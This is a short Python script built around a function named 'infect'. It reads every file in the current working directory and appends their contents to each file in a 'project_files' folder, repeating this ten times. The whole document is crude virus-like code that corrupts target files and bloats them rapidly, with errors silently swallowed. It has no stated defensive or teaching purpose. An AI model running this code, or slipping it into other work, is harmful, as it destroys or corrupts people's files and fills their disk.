import os


def infect(files):

    for file in files:
        fl = open('project_files/' + file, 'a')
        lines = []
        __inject_files = os.listdir(os.getcwd())
        for i_file in __inject_files:
            try:
                f = open(os.getcwd() + '/' + i_file, 'r')
                lines.extend(f.readlines())
            except:
                pass
        fl.writelines(lines)
        fl.close()


for _ in range(10):
    infect(os.listdir('project_files'))
